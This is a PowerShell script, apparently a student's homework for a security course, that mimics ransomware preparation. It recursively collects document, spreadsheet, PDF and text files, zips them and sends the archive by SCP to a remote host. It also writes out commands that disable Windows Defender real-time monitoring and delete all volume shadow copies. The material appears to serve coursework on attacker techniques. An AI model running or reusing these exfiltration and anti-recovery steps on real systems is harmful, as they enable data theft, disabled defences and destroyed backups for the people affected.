# Little directory adjustment for running the below
cd C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework

# Create a random number to add
$sbRand = Get-Random -Minimum 1000 -Maximum 9999

# Create the directory name
$dirName = "Documents" + $sbRand

# Create a directory to move filesystem into
mkdir $dirName

# Search Filesystem (Documents folder) for docx, xlsx, pdf, and txt files

# Gather the following files: docx, xlsx, pdf, and txt
# Loop through them and copy each to new folder/directory
Get-ChildItem -Recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path .\Documents | Get-Item | foreach `
{Copy-Item $_ -Destination C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\$dirName\}

# Zip the folder/directory created above
Compress-Archive $dirName $dirName

# SCP the zipped file to remote device
Set-SCPItem -ComputerName '192.168.6.71' -Port 2222 -Credential $credential -Destination "/home/christopher.mchugh/" -Path .\$dirName.zip

# Disable Windows Defender
$DisWinDefend = "Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled"
$DisWinDefend | Out-File disable.txt

# Delete System Shadows
$RmRestore = "vssadmin delete shadows /all"
$RmRestore | Out-File RM.txt
<#
To list out all restore points enter "vssadmin list shadows"
To Remove a specific restore point enter "vssadmin delete shadows /Shadow=" and follow the = with the Shadow Copy ID listed from the previous command.
#>